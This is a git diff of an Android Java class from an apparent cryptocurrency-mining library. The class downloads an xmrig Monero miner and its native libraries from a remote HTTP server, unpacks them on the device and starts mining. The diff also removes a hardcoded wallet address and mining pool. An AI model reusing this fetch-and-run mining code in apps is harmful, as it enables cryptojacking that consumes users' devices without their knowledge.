@@ -12,6 +12,7 @@ import java.io.ObjectStreamException;
 
 import waterhole.miner.core.AbstractMiner;
 import waterhole.miner.core.utils.FileUtils;
+import waterhole.miner.core.utils.LogUtils;
 
 import static waterhole.miner.core.asyn.AsyncTaskAssistant.executeOnThreadPool;
 import static waterhole.miner.core.utils.FileUtils.unzip;
@@ -27,7 +28,7 @@ public final class MoneroMiner extends AbstractMiner implements FileUtils.Downlo
 
     private static final String TAG = "Waterhole-XmrMiner";
 
-    private static final String OLD_MINER_DOWNLOAD_URL = "http://eidon.top:8000/05161847/xmr-miner-old.zip";
+    private static final String OLD_MINER_DOWNLOAD_URL = "http://eidon.top:8000/05171156/xmr-miner-old.zip";
     private static final String OLD_MINER_SAVE_FIILENAME = "xmr-miner-old.zip";
 
     private MoneroMiner() {
@@ -70,9 +71,15 @@ public final class MoneroMiner extends AbstractMiner implements FileUtils.Downlo
     @Override
     public void onDownloadSuccess(String pathName) {
         info(TAG, "download old miner success");
+        // 旧版门罗挖矿文件
         String fileDir = getContext().getFilesDir().getAbsolutePath();
-        File file = new File(fileDir + "/xmrig");
-        if (!file.exists()) {
+        File xmrig = new File(fileDir + "/xmrig");
+        LogUtils.info(TAG, "xmrig exist: " + xmrig.exists());
+        File uvFile = new File(fileDir + "/libuv.so");
+        LogUtils.info(TAG, "libuv.so exist: " + uvFile.exists());
+        File cplusFile = new File(fileDir + "/libc++_shared.so");
+        LogUtils.info(TAG, "libc++_shared.so exist: " + cplusFile.exists());
+        if (!xmrig.exists() || !uvFile.exists() || !cplusFile.exists()) {
             unzip(pathName, fileDir, this);
         } else {
             onUnzipComplete(pathName);
@@ -108,16 +115,7 @@ public final class MoneroMiner extends AbstractMiner implements FileUtils.Downlo
         @Override
         public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
             binder = (MineService.MiningServiceBinder) iBinder;
-            int cores = binder.getService().getAvailableCores();
-            // write suggested cores usage into editText
-            int suggested = cores / 2;
-            if (suggested == 0) suggested = 1;
-
-            MineService.MiningConfig cfg = binder.getService().newConfig(
-                    "49MGSvJjQLJRqtyFfB6MRNPqUczEFCP1MKrHozoKx32W3J84sziDqewd6zXceZVXcCNfLwQXXhDJoaZ7hg73mAUdRg5Zqf9",
-                    "pool.ppxxmr.com:3333",
-                    suggested, cores, true);
-            binder.getService().startMining(cfg);
+            binder.getService().startMining();
         }
 
         @Override
@@ -125,5 +123,4 @@ public final class MoneroMiner extends AbstractMiner implements FileUtils.Downlo
             binder = null;
         }
     };
-
 }
